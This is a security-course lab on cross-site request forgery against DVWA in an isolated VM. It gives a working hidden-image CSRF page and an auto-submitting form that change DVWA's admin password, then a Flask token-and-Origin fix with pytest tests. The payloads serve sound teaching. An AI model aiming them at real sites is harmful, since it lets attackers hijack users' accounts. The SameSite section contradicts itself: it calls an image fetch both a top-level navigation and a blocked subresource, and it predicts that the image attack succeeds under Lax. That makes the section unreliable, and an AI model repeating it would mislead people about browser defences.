---
title: "LAB-303-03 · Cross-Site Request Forgery"
description: "Trigger a state change from another origin, measure what SameSite actually blocks, then implement a synchroniser token and prove it."
module_code: CYB-303
level: 3
kind: lab
prerequisites: [CYB-303]
estimated_minutes: 120
difficulty: intermediate
safety: isolated-vm
lab_ids: [LAB-303-03]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [csrf, samesite, session, tokens, origin]
---

# LAB-303-03 · Cross-Site Request Forgery

## Scenario and background

CSRF is the one web flaw where the attacker never sees a response. They only need the victim's browser to make a
request the server will accept — and because cookies travel automatically, a request from another origin is
indistinguishable from a legitimate one unless the application asks for proof of intent.

You will build that proof-of-concept yourself, run it from a different origin against DVWA, then implement the
control properly in a local service and test it. The password you change is DVWA's `admin` account in your own
lab, and reverting the snapshot is part of teardown.

## Learning objectives

By the end of this lab you can:

1. Explain why a cross-origin request carries the victim's cookies and why that is sufficient to change state.
2. Build a minimal CSRF proof-of-concept page and serve it from a different origin.
3. Determine empirically whether `SameSite` blocks a given request shape, and why `Lax` still permits it.
4. Implement a session-bound synchroniser token and an `Origin` check.
5. Write tests proving the control rejects missing, wrong, and foreign tokens.

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| DVWA | current `master` | `http://192.0.2.30:4280`, **Low** |
| Browser | current | Login session must exist in this profile |
| Python 3 | 3.10+ | Serves the PoC page and the fixed service |
| Flask + pytest | 3.x, 7.x | Repair exercise |

!!! warning "Authorized scope — read before you begin"
    **Targets you may use:** `192.0.2.30:4280` (DVWA) and a local page plus service on `192.0.2.10`.
    **Targets you must not use:** any other site. The PoC is a page you wrote, pointing at an application you
    own, with an account you control.

    **You will change DVWA's admin password.** That is the lab's state change and it is confined to your own VM.
    Do not run this against any account you did not create, and revert the snapshot afterwards.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model

The victim is logged in to the target application and visits a page the attacker controls. The attacker cannot
read the response and cannot read the victim's cookies — they can only cause a request. The control that stops
them must therefore prove the request originated from the application itself, not merely that it carried a valid
session.

## Environment

| Host | Role | Address |
| --- | --- | --- |
| `lab-analyst` | Browser, attacker page, fixed service | 192.0.2.10 |
| `lab-web` | DVWA | 192.0.2.30 |

**Network view**

```text
lab-analyst 192.0.2.10                          lab-web 192.0.2.30
  :8000 attacker page (img/form) ──▶ :4280 DVWA (csrf module)
  repo/fixed_app.py 127.0.0.1:5003  local only
```

## Before you start

1. Snapshot `pre-lab-303-03`. You will revert to it at the end.
2. Log in to DVWA as `admin` / `password` in the browser you will use, and confirm **DVWA Security → Low**.
3. Create `~/lab/level-3/lab-303-03/{evidence,repo}/`.

## Procedure

### 1. Confirm the request works without any token

Before building a page, confirm that the server accepts the state change with only a cookie. Two DVWA requests
from `curl`, using the session jar:

```bash
DV='http://192.0.2.30:4280'
curl -sS -b evidence/dvwa.jar -o evidence/own-change.html -w 'change=%{http_code}\n' -G \
  "$DV/vulnerabilities/csrf/" \
  --data-urlencode 'password_new=Lab-Only-303-a' \
  --data-urlencode 'password_conf=Lab-Only-303-a' \
  --data-urlencode 'Change=Change'
```

**Expected:** `200`, and the body reports a successful password change. There was no token, no confirmation, and
no re-authentication — only a valid session and a `GET`.

**Why `GET` is the worst case:** it can be triggered by an `<img>` tag, a link prefetch, or a top-level
navigation. A `POST` requires a form, which `SameSite=Lax` blocks cross-site; a `GET` does not.

### 2. Build the proof-of-concept page

Serve it from a different origin — `192.0.2.10:8000` is a different host from `192.0.2.30`, so the browser treats
it as cross-site.

```bash
mkdir -p ~/lab/level-3/lab-303-03/repo && cd ~/lab/level-3/lab-303-03/repo
cat > csrf-poc.html <<'HTML'
<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Lab 303-03 CSRF proof of concept</title>
<h1>Loading…</h1>
<!-- Deliberately a GET: no form, no token, no user interaction beyond visiting this page. -->
<img src="http://192.0.2.30:4280/vulnerabilities/csrf/?password_new=Lab-Only-303-b&password_conf=Lab-Only-303-b&Change=Change"
     alt="" width="1" height="1">
<p>If the target accepted this request, its password is now <code>Lab-Only-303-b</code>.</p>
</html>
HTML

cp csrf-poc.html index.html
python3 -m http.server 8000 --bind 192.0.2.10
```

**Why an `<img>`:** it needs no interaction, no JavaScript, and no form. The browser fetches it because the page
said so. From the server's perspective it is an ordinary request with a valid session cookie attached.

Now, in the browser profile that is logged in to DVWA, open `http://192.0.2.10:8000/csrf-poc.html`. Then log out
and try to log in with the original password, then with `Lab-Only-303-b`.

**Expected:** the original password fails and the new one succeeds. The state change happened because the victim
loaded a page — nothing else.

**Record everything:** the PoC source, the browser's request (proxy or devtools), and both login attempts. A CSRF
finding without the PoC source and a before/after login is an assertion, not evidence.

### 3. Measure what `SameSite` actually blocked

DVWA's `PHPSESSID` has no `SameSite` attribute. Determine the browser's *applied* value, then test both shapes:

```bash
# What did the browser actually apply?
# devtools → Application → Cookies → http://192.0.2.30:4280 → SameSite column
```

| Request shape | Trigger | Under `SameSite=Lax` | Under `SameSite=Strict` |
| --- | --- | --- | --- |
| Top-level navigation (`GET`) | Link, address bar, `<img>` in some engines | **Cookie sent** | Not sent |
| Form `POST` from another site | `<form method=post>` + submit | Not sent | Not sent |
| Subresource (`<img>`, `<script>`) | Any embed | Not sent | Not sent |

**Expected:** the `GET`-based PoC succeeds even with `Lax` applied, because `Lax` permits top-level navigation. This
is the specific reason `SameSite=Lax` is not a CSRF fix, and it is the observation to write down.

Then change the PoC to a `POST` form and re-test:

```html
<form action="http://192.0.2.30:4280/vulnerabilities/csrf/" method="POST" id="f">
  <input name="password_new" value="Lab-Only-303-c">
  <input name="password_conf" value="Lab-Only-303-c">
  <input name="Change" value="Change">
</form>
<script>document.getElementById('f').submit()</script>
```

**Expected:** under `Lax`, the `POST` fails to carry the session cookie, and the application either rejects the
change or treats it as unauthenticated. If it succeeds, `SameSite` is not being applied at all — record that.

**Why the distinction matters for reporting:** "CSRF exists" and "CSRF exists but is currently limited to
top-level GET by browser defaults" are different findings with different severities. Measure, then write.

### 4. Build the fixed service

A synchroniser token bound to the session, plus an `Origin` check:

```bash
cd ~/lab/level-3/lab-303-03/repo
mkdir -p tests
cat > fixed_app.py <<'PY'
"""Password change protected by a session-bound CSRF token and an Origin check."""
import hmac
import secrets
from flask import Flask, session, request, jsonify

app = Flask(__name__)
app.secret_key = secrets.token_bytes(32)     # lab only; load from config in production

@app.get("/token")
def token():
    if "csrf" not in session:
        session["csrf"] = secrets.token_urlsafe(32)
    return jsonify(token=session["csrf"])

@app.post("/change-password")
def change_password():
    # 1. Origin check: refuse anything that did not come from us.
    origin = request.headers.get("Origin")
    if origin is not None and origin != "http://127.0.0.1:5003":
        return jsonify(error="forbidden"), 403

    # 2. Token check: bound to this session, compared in constant time.
    sent = request.form.get("csrf_token", "")
    expected = session.get("csrf", "")
    if not expected or not hmac.compare_digest(sent, expected):
        return jsonify(error="forbidden"), 403

    # 3. Only now perform the state change (a lab stub).
    return jsonify(status="changed")
PY

cat > tests/test_csrf.py <<'PY'
import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
import pytest
from fixed_app import app

@pytest.fixture()
def client():
    app.config.update(TESTING=True)
    with app.test_client() as c:
        yield c

def seed_token(client):
    with client.session_transaction() as s:
        s["csrf"] = "known-token-for-tests"
    return "known-token-for-tests"

def test_change_without_token_is_rejected(client):
    seed_token(client)
    assert client.post("/change-password", data={"new": "x"}).status_code == 403

def test_change_with_wrong_token_is_rejected(client):
    seed_token(client)
    assert client.post("/change-password", data={"csrf_token": "guess"}).status_code == 403

def test_change_with_correct_token_succeeds(client):
    t = seed_token(client)
    assert client.post("/change-password", data={"csrf_token": t}).status_code == 200

def test_foreign_origin_is_rejected_even_with_token(client):
    t = seed_token(client)
    r = client.post("/change-password", data={"csrf_token": t},
                    headers={"Origin": "http://192.0.2.10:8000"})
    assert r.status_code == 403

def test_token_is_per_session(client):
    seed_token(client)
    with client.session_transaction() as s:
        s["csrf"] = "different-session-token"
    assert client.post("/change-password",
                       data={"csrf_token": "known-token-for-tests"}).status_code == 403
PY

python3 -m venv .venv && . .venv/bin/activate
pip install flask pytest
python -m pytest -q
```

**Expected:** five passing tests.

**Why each check is there:** the token proves the request was constructed by a page the application served to
*this* session; the `Origin` check is a second, independent signal that fails closed only when the header is
present (some clients omit it — decide deliberately whether to reject those, and document the choice).

### 5. Verify against the running service

```bash
FLASK_APP=fixed_app.py flask run --host 127.0.0.1 --port 5003 &
sleep 2
curl -sS -c /tmp/csrf.jar http://127.0.0.1:5003/token | tee /tmp/tok.json
T=$(python3 -c 'import json;print(json.load(open("/tmp/tok.json"))["token"])')

curl -sS -o /dev/null -w 'no-token=%{http_code}\n' -b /tmp/csrf.jar -X POST \
  http://127.0.0.1:5003/change-password --data 'new=whatever'

curl -sS -o /dev/null -w 'with-token=%{http_code}\n' -b /tmp/csrf.jar -X POST \
  http://127.0.0.1:5003/change-password --data "csrf_token=$T&new=whatever"

curl -sS -o /dev/null -w 'foreign-origin=%{http_code}\n' -b /tmp/csrf.jar -X POST \
  -H 'Origin: http://192.0.2.10:8000' \
  http://127.0.0.1:5003/change-password --data "csrf_token=$T&new=whatever"
kill %1
```

**Expected:** `403`, `200`, `403`. The same three results as the tests, from a real client.

### 6. Write the finding and the fix note

In `evidence/csrf-finding.md`: the request shape, the PoC source, the before/after login evidence, whether
`SameSite` limited it, the impact (an attacker with a page can change the victim's credentials), and the fix
(token plus `Origin` check, with the code). Two hundred words, no adjectives.

## Evidence to collect

- `repo/csrf-poc.html` — the proof of concept, with comments explaining each element.
- `evidence/before-after-login.txt` — both login attempts after the PoC.
- `evidence/samesite.md` — the applied value and the GET versus POST result table.
- `repo/fixed_app.py`, `repo/tests/`, `evidence/pytest.txt`, `evidence/live-check.txt`.
- `evidence/csrf-finding.md`.

## Verification

- [ ] The PoC changed the password from a different origin with no user interaction beyond loading a page.
- [ ] Both the original and the new password were tested afterwards.
- [ ] The browser's applied `SameSite` value is recorded, with the GET and POST outcomes.
- [ ] Five tests pass; live checks return `403`, `200`, `403`.
- [ ] The finding states the request shape and cites the PoC source.

## Teardown and reset

**This lab changed DVWA's admin password.** Revert the snapshot `pre-lab-303-03`, or reset the database from
`/setup.php`. Then confirm you can log in again with the documented default credentials.

```bash
deactivate 2>/dev/null
rm -f /tmp/csrf.jar /tmp/tok.json
```

Stop the Python HTTP server on port 8000. Keep `repo/` and `evidence/`.

## Reflection

1. CSRF needs no response read. Explain why that makes it invisible to a test that only inspects response bodies.
2. The `GET` PoC worked under `SameSite=Lax`; the `POST` did not. State the rule, then explain why a developer might
   still ship a state-changing `GET`.
3. Your token is stored in the session. Describe an attack that would defeat a token stored in a cookie *without*
   being bound to the session.
4. The `Origin` check only rejects when the header is present. Argue for and against failing closed when it is
   absent.

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Demonstration | Described, not performed | PoC worked, password changed | PoC worked and both before/after logins recorded |
| `SameSite` analysis | Not tested | Applied value recorded | GET and POST compared, with the `Lax` rule stated |
| Fix | Advice only | Token implemented | Token plus `Origin` check, constant-time compare, per-session binding |
| Testing | Manual only | Tests pass | Tests cover missing, wrong, foreign-origin, and cross-session cases |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| PoC page loads but nothing changes | Not logged in, or DVWA security not Low | Log in again in the same profile; check the module |
| Image request blocked as mixed content | Page served over HTTPS, target over HTTP | Serve the PoC over plain HTTP too |
| Password change appeared to work but login fails | Password was changed by an earlier run | Revert snapshot and start over |
| `POST` PoC succeeds with cookies | `SameSite` not applied by this browser version | Record it; it is a real observation about browser behaviour |
| Fixed service returns `403` with a valid token | Session cookie not sent by `curl` | Use `-b` with the jar that received the session |
| Flask `secret_key` warning | Key regenerated per process | Expected in the lab; note why production must persist it |

## References

1. OWASP WSTG v4.2 — WSTG-SESS-05 Testing for Cross Site Request Forgery.
2. OWASP Cross-Site Request Forgery Prevention Cheat Sheet. Accessed 2026-10-29.
3. OWASP Top 10:2025 — A01 Broken Access Control. <https://owasp.org/Top10/2025/>
4. MDN — `SameSite` cookies. Accessed 2026-10-29.
5. RFC 6265bis — Cookies (SameSite semantics).
